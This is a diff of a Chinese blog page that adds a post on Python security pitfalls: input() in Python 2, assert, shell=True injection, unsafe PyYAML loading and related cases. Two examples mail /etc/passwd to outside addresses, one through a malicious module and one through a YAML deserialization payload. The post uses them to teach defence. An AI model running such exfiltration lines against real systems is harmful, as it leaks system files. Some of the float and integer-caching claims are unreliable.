@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="best_practice," />
+  <meta name="keywords" content="python_tips," />
 
 
 
@@ -86,16 +86,15 @@
 
 
 
-<meta name="description" content="喜欢Linux, Coding, 文艺, 运动。 生活如此多彩，我时间挥霍不过来。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何使用Python写出优雅而安全的代码">
+<meta property="og:title" content="使用Python中的一些安全建议">
 <meta property="og:url" content="https://blog.yumaojun.net/2017/01/02/python-bestpractice/index.html">
 <meta property="og:site_name" content="紫川秀的博客">
-<meta property="og:description" content="喜欢Linux, Coding, 文艺, 运动。 生活如此多彩，我时间挥霍不过来。">
-<meta property="og:updated_time" content="2017-01-02T03:58:37.000Z">
+<meta property="og:image" content="http://oiw1gzfww.bkt.clouddn.com/python_tips_.png">
+<meta property="og:updated_time" content="2017-01-10T05:49:31.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="如何使用Python写出优雅而安全的代码">
-<meta name="twitter:description" content="喜欢Linux, Coding, 文艺, 运动。 生活如此多彩，我时间挥霍不过来。">
+<meta name="twitter:title" content="使用Python中的一些安全建议">
+<meta name="twitter:image" content="http://oiw1gzfww.bkt.clouddn.com/python_tips_.png">
 
 
 
@@ -129,7 +128,7 @@
 
 
 
-  <title> 如何使用Python写出优雅而安全的代码 | 紫川秀的博客 </title>
+  <title> 使用Python中的一些安全建议 | 紫川秀的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -319,7 +318,7 @@
             
             
               
-                如何使用Python写出优雅而安全的代码
+                使用Python中的一些安全建议
               
             
           </h1>
@@ -334,7 +333,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-02T11:46:29+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-02T12:46:29+08:00">
                 2017-01-02
               </time>
             
@@ -397,7 +396,7 @@
 
           
           
-             <span id="/2017/01/02/python-bestpractice/" class="leancloud_visitors" data-flag-title="如何使用Python写出优雅而安全的代码">
+             <span id="/2017/01/02/python-bestpractice/" class="leancloud_visitors" data-flag-title="使用Python中的一些安全建议">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -424,7 +423,33 @@
       
 
       
-        
+        <p><img src="http://oiw1gzfww.bkt.clouddn.com/python_tips_.png" alt=""><br><a id="more"></a></p>
+<p>由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。</p>
+<h2 id="input函数"><a href="#input函数" class="headerlink" title="input函数"></a>input函数</h2><p>在<code>Python 2</code>大量的内置功能集合中，<code>input</code>完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  ~ python2</div><div class="line">Python 2.7.12 (default, Dec  2 2016, 21:51:52)</div><div class="line">[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwin</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">dir()</div><div class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>]</div><div class="line">&gt;&gt;&gt; input()</div><div class="line">__import__(<span class="string">'sys'</span>).exit()</div><div class="line">➜  ~</div></pre></td></tr></table></figure></p>
+<p>显然，必须永远不使用<code>input</code>函数，除非脚本的标准输入中的数据是完全可信的。 <code>Python 2</code>文档建议将<code>raw_input</code>作为一个安全的替代品。在<code>Python 3</code>中，<code>input</code>函数等同于<code>raw_input</code>，从而一劳永逸地解决了这个隐患</p>
+<h2 id="assert语句"><a href="#assert语句" class="headerlink" title="assert语句"></a>assert语句</h2><p>在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_credentials</span><span class="params">(username, password)</span>:</span></div><div class="line">    <span class="keyword">assert</span> username <span class="keyword">and</span> password, <span class="string">'Credentials not supplied by caller'</span></div><div class="line">    ... authenticate possibly null user <span class="keyword">with</span> null password ...</div></pre></td></tr></table></figure></p>
+<p>然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。</p>
+<h2 id="不要使用is来比较int"><a href="#不要使用is来比较int" class="headerlink" title="不要使用is来比较int"></a>不要使用is来比较int</h2><p>在我们的印象里，int是不可变对象，我们来看看下面这个例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">257</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a == b</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">256</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p>
+<p>为了避免每次给经常使用到这部分整数分配一个新的内存，<code>Python</code>预先生成并缓存好这些常用整数(<code>[-5, 257)</code>)，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。<br>因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。</p>
+<h2 id="float的舍入问题"><a href="#float的舍入问题" class="headerlink" title="float的舍入问题"></a>float的舍入问题</h2><p>因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算<br>我们看看下面一个有趣的现象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">1</span>]: <span class="number">0.2</span></div><div class="line"></div><div class="line">In [<span class="number">2</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">2</span>]: <span class="number">0.30000000000000004</span></div><div class="line"></div><div class="line">In [<span class="number">3</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">3</span>]: <span class="number">0.4</span></div><div class="line"></div><div class="line">In [<span class="number">4</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">4</span>]: <span class="number">0.5</span></div><div class="line"></div><div class="line">In [<span class="number">5</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">5</span>]: <span class="number">0.6</span></div><div class="line"></div><div class="line">In [<span class="number">6</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">6</span>]: <span class="number">0.7</span></div><div class="line"></div><div class="line">In [<span class="number">7</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">7</span>]: <span class="number">0.7999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">8</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">8</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">9</span>]: <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span> + <span class="number">0.1</span></div><div class="line">Out[<span class="number">9</span>]: <span class="number">0.9999999999999999</span></div></pre></td></tr></table></figure></p>
+<p>我看到有位网友的提出的解决方案：</p>
+<blockquote>
+<p>我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">40</span>]: <span class="number">0.4</span> + <span class="number">0.2</span></div><div class="line">Out[<span class="number">40</span>]: <span class="number">0.6000000000000001</span></div><div class="line"></div><div class="line">In [<span class="number">41</span>]: (<span class="number">0.45</span> + <span class="number">0.25</span>) - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">41</span>]: <span class="number">0.</span></div><div class="line"></div><div class="line">In [<span class="number">49</span>]: <span class="number">0.6</span> + <span class="number">0.3</span></div><div class="line">Out[<span class="number">49</span>]: <span class="number">0.8999999999999999</span></div><div class="line"></div><div class="line">In [<span class="number">50</span>]: <span class="number">0.65</span> + <span class="number">0.35</span> - (<span class="number">0.05</span> + <span class="number">0.05</span>)</div><div class="line">Out[<span class="number">50</span>]: <span class="number">0.9</span></div></pre></td></tr></table></figure></p>
+</blockquote>
+<p>最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。</p>
+<h2 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h2><p>Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">54</span>]: <span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         self.__private = <span class="number">1</span></div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">get_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> self.__private</div><div class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">has_private</span><span class="params">(self)</span>:</span></div><div class="line">    ...:         <span class="keyword">return</span> hasattr(self, <span class="string">'__private'</span>)</div><div class="line">    ...:</div><div class="line"></div><div class="line">In [<span class="number">55</span>]: x = X()</div><div class="line"></div><div class="line">In [<span class="number">56</span>]: x.has_private()</div><div class="line">Out[<span class="number">56</span>]: <span class="keyword">False</span></div><div class="line"></div><div class="line">In [<span class="number">57</span>]: x.get_private()</div><div class="line">Out[<span class="number">57</span>]: <span class="number">1</span></div><div class="line"></div><div class="line">In [<span class="number">58</span>]: x.__private = <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">59</span>]: x.__private</div><div class="line">Out[<span class="number">59</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">60</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">60</span>]: <span class="keyword">True</span></div><div class="line"></div><div class="line">In [<span class="number">61</span>]: x._X__private</div><div class="line">Out[<span class="number">61</span>]: <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p>然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">62</span>]: x.__private</div><div class="line">Out[<span class="number">62</span>]: <span class="number">2</span></div><div class="line"></div><div class="line">In [<span class="number">63</span>]: hasattr(x, <span class="string">'__private'</span>)</div><div class="line">Out[<span class="number">63</span>]: <span class="keyword">True</span></div></pre></td></tr></table></figure></p>
+<p>如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞</p>
+<h2 id="模块执行"><a href="#模块执行" class="headerlink" title="模块执行"></a>模块执行</h2><p>语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ cat malicious.py</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">os.system(<span class="string">'cat /etc/passwd | mail attacker@blackhat.com'</span>)</div><div class="line"><span class="keyword">del</span> sys.modules[<span class="string">'malicious'</span>]  <span class="comment"># pretend it's not imported</span></div><div class="line">$ python</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> malicious</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(malicious)</div><div class="line">Traceback(most recent call last):</div><div class="line">NameError:</div><div class="line">    name <span class="string">'malicious'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</div></pre></td></tr></table></figure></p>
+<h2 id="猴子补丁"><a href="#猴子补丁" class="headerlink" title="猴子补丁"></a>猴子补丁</h2><p>运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。<br>攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。</p>
+<p>Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">X</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Y</span><span class="params">(object)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj = X()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.X object at <span class="number">0x7f62dbe5e010</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj.__class__ = Y</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x_obj</div><div class="line">&lt;__main__.Y object at <span class="number">0x7f62dbe5d350</span> &gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, X)</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>isinstance(x_obj, Y)</div><div class="line"><span class="keyword">True</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
+<p>对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。</p>
+<h2 id="通过subprocess进行shell注入"><a href="#通过subprocess进行shell注入" class="headerlink" title="通过subprocess进行shell注入"></a>通过subprocess进行shell注入</h2><p>以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'date'</span>)</div><div class="line"><span class="number">2017</span>年 <span class="number">1</span>月<span class="number">10</span>日 星期二 <span class="number">13</span>时<span class="number">11</span>分<span class="number">53</span>秒 CST</div><div class="line"><span class="number">0</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>
+<p>但有一个陷阱！要利用<code>UNIX shell</code>服务，例如命令行参数扩展，call函数的<code>shell</code>关键字参数应该设置为<code>True</code>。然后原样传递call函数的第一个参数给系统<code>shell</code>，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>call(<span class="string">'cut -d: -f1 /etc/passwd'</span>, shell=<span class="keyword">True</span>)</div><div class="line">nobody</div><div class="line">root</div><div class="line">daemon</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>显然，将<code>shell</code>关键字保持默认值<code>False</code>，并且提供命令及其参数的数组给<code>subprocess</code>函数，不要为外部命令执行调用<code>UNIX shell</code>，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被<code>shell</code>解析或展开。<br>如果应用的本质决定了使用<code>UNIX shell</code>服务，那么清理一切到 <code>subprocess</code>的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的<code>shlex.quote</code>函数来进行shell转义。</p>
+<h2 id="序列化-pyYAML"><a href="#序列化-pyYAML" class="headerlink" title="序列化-pyYAML"></a>序列化-pyYAML</h2><p>作为一个流行的配置文件格式，<code>YAML</code>不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上<code>Python</code>的<code>YAML</code>默认实现—-<code>PyYAML</code>让反序列化看起来非常无辜：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dangerous_input = <span class="string">"""</span></div><div class="line"><span class="meta">... </span>some_option: !!python/object/apply:subprocess.call</div><div class="line"><span class="meta">... </span>  args: [cat /etc/passwd | mail 719118794@qq.com]</div><div class="line"><span class="meta">... </span>  kwds: &#123;shell: true&#125;</div><div class="line"><span class="meta">... </span>"""</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(dangerous_input)</div><div class="line">&#123;<span class="string">'some_option'</span>: <span class="number">0</span>&#125;</div></pre></td></tr></table></figure></p>
+<p>而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库</p>
+
       
     </div>
 
@@ -463,7 +488,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/best-practice/" rel="tag"># best_practice</a>
+            <a href="/tags/python-tips/" rel="tag"># python_tips</a>
           
         </div>
       
@@ -511,7 +536,7 @@
   <div class="comments" id="comments">
     
       <div class="ds-thread" data-thread-key="2017/01/02/python-bestpractice/"
-           data-title="如何使用Python写出优雅而安全的代码" data-url="https://blog.yumaojun.net/2017/01/02/python-bestpractice/">
+           data-title="使用Python中的一些安全建议" data-url="https://blog.yumaojun.net/2017/01/02/python-bestpractice/">
       </div>
     
   </div>
@@ -535,8 +560,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="http://oiw1gzfww.bkt.clouddn.com/me.png"
@@ -567,7 +601,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">7</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -646,6 +680,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#input函数"><span class="nav-number">1.</span> <span class="nav-text">input函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assert语句"><span class="nav-number">2.</span> <span class="nav-text">assert语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不要使用is来比较int"><span class="nav-number">3.</span> <span class="nav-text">不要使用is来比较int</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#float的舍入问题"><span class="nav-number">4.</span> <span class="nav-text">float的舍入问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#私有属性"><span class="nav-number">5.</span> <span class="nav-text">私有属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模块执行"><span class="nav-number">6.</span> <span class="nav-text">模块执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猴子补丁"><span class="nav-number">7.</span> <span class="nav-text">猴子补丁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过subprocess进行shell注入"><span class="nav-number">8.</span> <span class="nav-text">通过subprocess进行shell注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#序列化-pyYAML"><span class="nav-number">9.</span> <span class="nav-text">序列化-pyYAML</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
     </div>
